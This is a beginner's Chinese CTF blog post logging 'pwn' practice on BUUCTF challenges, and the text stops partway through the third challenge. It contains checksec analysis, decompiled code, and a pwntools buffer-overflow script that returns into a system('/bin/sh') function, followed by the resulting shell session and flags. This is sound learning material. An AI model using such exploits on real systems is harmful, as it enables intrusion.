@@ -1,0 +1,909 @@
+<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="小白初试pwn，会学会吗。。25.12 看来是无功而返了。。"><title>【CTF】pwn学习之路</title><link rel=canonical href=https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="【CTF】pwn学习之路"><meta property='og:description' content="小白初试pwn，会学会吗。。25.12 看来是无功而返了。。"><meta property='og:url' content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/'><meta property='og:site_name' content="wuko's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-05-21T00:00:00+00:00'><meta property='article:modified_time' content='2025-05-21T00:00:00+00:00'><meta property='og:image' content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/cover.jpg'><meta name=twitter:title content="【CTF】pwn学习之路"><meta name=twitter:description content="小白初试pwn，会学会吗。。25.12 看来是无功而返了。。"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_af0a7c4a31bebdf7.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💭</span></figure><div class=site-meta><h1 class=site-name><a href=/>wuko's blog</a></h1><h2 class=site-description>从零开始，由心而发。欢迎共同交流学习！</h2></div></header><ol class=menu-social><li><a href=https://github.com/wuko233 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/@Arair237 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/pages/about.html/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-vocabulary"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 19H4a1 1 0 01-1-1V4a1 1 0 011-1h6a2 2 0 012 2 2 2 0 012-2h6a1 1 0 011 1v14a1 1 0 01-1 1h-6a2 2 0 00-2 2 2 2 0 00-2-2z"/><path d="M12 5v16"/><path d="M7 7h1"/><path d="M7 11h1"/><path d="M16 7h1"/><path d="M16 11h1"/><path d="M16 15h1"/></svg>
+<span>About</span></a></li><li><a href=/pages/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/pages/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/pages/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/pages/money/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-tip-jar"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 10h-2.5a1.5 1.5.0 000 3h1a1.5 1.5.0 010 3H10"/><path d="M12 9v1"/><path d="M12 16v1"/><path d="M17 4v1.882c0 .685.387 1.312 1 1.618s1 .933 1 1.618V18a3 3 0 01-3 3H8a3 3 0 01-3-3V9.118c0-.685.387-1.312 1-1.618s1-.933 1-1.618V4"/><path d="M6 4h12z"/></svg>
+<span>Donate</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#test_your_nc>test_your_nc</a></li><li><a href=#rip>rip</a></li><li><a href=#warmup_csaw_2016>warmup_csaw_2016</a></li><li><a href=#ciscn_2019_n_1-改值>ciscn_2019_n_1 （改值）</a></li><li><a href=#pwn1_sctf_2016-fgets>pwn1_sctf_2016 (fgets())</a></li><li><a href=#jarvisoj_level0-read>jarvisoj_level0 (read())</a></li><li><a href=#第五空间2019-决赛pwn5-字符串格式化漏洞>[第五空间2019 决赛]PWN5 (字符串格式化漏洞)</a></li><li><a href=#jarvisoj_level2>jarvisoj_level2</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/posts/2025/05/21/pwnpwnpwn.html/><img src=/posts/2025/05/21/pwnpwnpwn.html/cover_hu_bb9f66c9ff0404cf.jpg srcset="/posts/2025/05/21/pwnpwnpwn.html/cover_hu_bb9f66c9ff0404cf.jpg 800w, /posts/2025/05/21/pwnpwnpwn.html/cover_hu_7f651e857e87bda1.jpg 1600w" width=800 height=483 loading=lazy alt="Featured image of post 【CTF】pwn学习之路"></a></div><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ style=background-color:#2a9d8f;color:#fff>网络安全</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/2025/05/21/pwnpwnpwn.html/>【CTF】pwn学习之路</a></h2><h3 class=article-subtitle>小白初试pwn，会学会吗。。25.12 看来是无功而返了。。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-05-21T00:00:00Z>May 21, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 12 分钟</time></div></footer></div></header><section class=article-content><p>初学者。。用于记录学习过程与笔记。</p><h2 id=test_your_nc>test_your_nc</h2><p>先用<code>checksec</code>检查下：</p><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-1.png width=1882 height=157 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-1_hu_e3c2d6c54aeca693.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-1_hu_bf10e3604426127e.png 1024w" loading=lazy alt=checksec1 class=gallery-image data-flex-grow=1198 data-flex-basis=2876px></p><ol><li><p><strong>RELRO</strong><br><code>Partial</code> → GOT 表可写（易被 <code>GOT overwrite</code> 攻击）。<code>Full</code> 时 GOT 只读更安全。</p></li><li><p><strong>STACK CANARY</strong><br><code>未启用</code> → 栈溢出无检测，可直接覆盖返回地址。启用后栈破坏会崩溃。</p></li><li><p><strong>NX</strong><br><code>开启</code> → 栈/堆不可执行。</p></li><li><p><strong>PIE</strong><br><code>开启</code> → 代码地址随机化，需泄露地址。关闭则地址固定。</p></li><li><p><strong>RPATH/RUNPATH</strong><br><code>未设置</code> → 无额外库路径，降低劫持风险。</p></li><li><p><strong>Symbols</strong><br><code>64</code> → 保留符号（函数名等），易逆向分析。</p></li><li><p><strong>FORTIFY</strong><br><code>未启用</code> → 无堆栈保护。</p></li></ol><p>再拖到<code>IDA Pro</code>里看看:</p><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-2.png width=948 height=169 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-2_hu_2f6bd30fcc236cdb.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-2_hu_e0f8bac57d0aca10.png 1024w" loading=lazy alt=ida1 class=gallery-image data-flex-grow=560 data-flex-basis=1346px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接调用<code>system()</code>函数进入shell，所以直接使用<code>netcat</code>连接靶机：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc ip port
+</span></span></code></pre></td></tr></table></div></div><p><img src=/posts/2025/05/21/pwnpwnpwn.html/1-3.png width=1186 height=1004 srcset="/posts/2025/05/21/pwnpwnpwn.html/1-3_hu_df26e22eb82f79ba.png 480w, /posts/2025/05/21/pwnpwnpwn.html/1-3_hu_870bba6598b049b1.png 1024w" loading=lazy alt=nc1 class=gallery-image data-flex-grow=118 data-flex-basis=283px></p><p>发现直接连接上了，根目录就有flag，得到：<code>flag{b6588539-d35f-4fde-b2b9-8c56d7fb66bd}</code></p><h2 id=rip>rip</h2><p><code>checksec</code>分析：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>❯ checksec --file<span class=o>=</span>./pwn1
+</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
+</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   <span class=m>64</span> Symbols        No    <span class=m>0</span>               <span class=m>1</span>    ./pwn1
+</span></span></code></pre></td></tr></table></div></div><p><code>IDA Pro</code>分析主函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span> <span class=c1>// [rsp+1h] [rbp-Fh] BYREF
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;please input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;ok,bye!!!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>同时注意到<code>fun()</code>函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>fun</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>gets()</code>函数不检查输入长度，所以可利用其来溢出<code>s</code>，到达shellcode也就是<code>fun()</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; Attributes: bp-based frame
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; int fun()
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>                 <span class=nf>public</span> <span class=no>fun</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=nf>fun</span>             <span class=no>proc</span> <span class=no>near</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span> <span class=c1>; __unwind {
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401186</span>                 <span class=nf>push</span>    <span class=no>rbp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401187</span>                 <span class=nf>mov</span>     <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040118</span><span class=nf>A</span>                 <span class=no>lea</span>     <span class=no>rdi</span><span class=p>,</span> <span class=no>command</span>    <span class=c1>; &#34;/bin/sh&#34;
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401191</span>                 <span class=nf>call</span>    <span class=no>_system</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401196</span>                 <span class=nf>nop</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401197</span>                 <span class=nf>pop</span>     <span class=no>rbp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span>                 <span class=nf>retn</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span> <span class=c1>; } // starts at 401186
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000401198</span> <span class=nf>fun</span>             <span class=no>endp</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意到shellcode位于<code>40118A</code>，所以我们要让其执行这个地址的命令。</p><p>那么如何溢出呢？首先要填满<code>s[15]</code>，也就是15个字节，与此同时，还需要添加8个字节来顶掉基指针寄存器<code>rbp;</code>：</p><blockquote><p>rbp (Base Pointer Register) 是x86-64架构中的基指针寄存器,用于标记当前函数栈帧的起始位置
+每个函数调用都会在栈上保存前一个函数的RBP值 ,
+这个保存操作占用固定的8字节空间,
+在缓冲区溢出攻击中，这8字节是覆盖返回地址前必须越过的最后一个屏障,
+x86架构是4字节，x64架构是8字节 → 这是64位系统的关键特征</p></blockquote><p>所以构建payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>23</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40118A</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>先发送23个q使其溢出，后面接上shellcode<code>fun()</code>中终端函数的地址，尝试进入shell。</p><blockquote><p><code>p64()</code> 是 Python 中 <strong>pwntools</strong> 库的核心函数，用于将整数转换为<strong>64位小端序字节序列</strong>。在 pwn 漏洞利用中，它用于精确构造内存地址格式的 payload。</p></blockquote><p>最终程序：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25983</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>23</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40118A</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>详解：</p><p>新建一个<code>sh</code>对象，用于连接靶机以及操作靶机；</p><blockquote><p><strong>remote()函数</strong>：pwntools的核心函数，用于创建TCP连接
+<code>sendline()</code>向靶机发送payload;</p></blockquote><blockquote><p><strong>sendline()</strong>：发送数据并在末尾自动添加 <code>\n</code>（0x0A）
+重要：因为原程序使用 <code>gets()</code> 函数，该函数以 <code>\n</code> 或 EOF 为结束标志</p></blockquote><blockquote><p><strong>interactive()</strong>：作用：在攻击成功后进入交互式shell</p></blockquote><p><strong>发送内容</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>qqqqqqqqqqqqqqqqqqqqqqq + \x8A\x11\x40\x00\x00\x00\x00\x00 + \n
+</span></span></code></pre></td></tr></table></div></div><p>执行，获取到了shell，获得flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>root</span><span class=o>&gt;</span> <span class=o>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> <span class=n>d</span><span class=p>:</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=err>项目</span><span class=o>/</span><span class=n>BUU</span><span class=o>/</span><span class=n>pwn</span><span class=o>/</span><span class=n>rip</span><span class=o>/</span><span class=n>hack</span><span class=o>.</span><span class=n>py</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span><span class=p>:</span> <span class=n>Trying</span> <span class=mf>117.21</span><span class=o>.</span><span class=mf>200.176</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span><span class=p>:</span> <span class=n>Done</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>bin</span>
+</span></span><span class=line><span class=cl><span class=n>boot</span>
+</span></span><span class=line><span class=cl><span class=n>dev</span>
+</span></span><span class=line><span class=cl><span class=n>etc</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=n>home</span>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=k>var</span>
+</span></span><span class=line><span class=cl><span class=n>cat</span> <span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=mi>7</span><span class=n>f35d897</span><span class=o>-</span><span class=n>a5fd</span><span class=o>-</span><span class=mi>4505</span><span class=o>-</span><span class=mi>84</span><span class=n>a7</span><span class=o>-</span><span class=mi>2990</span><span class=n>b740f2d9</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=warmup_csaw_2016>warmup_csaw_2016</h2><p>先<code>checksec</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>❯ checksec --file<span class=o>=</span><span class=s1>&#39;/home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016&#39;</span>
+</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    <span class=m>0</span>               <span class=m>2</span>               /home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016
+</span></span></code></pre></td></tr></table></div></div><p>分析程序：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
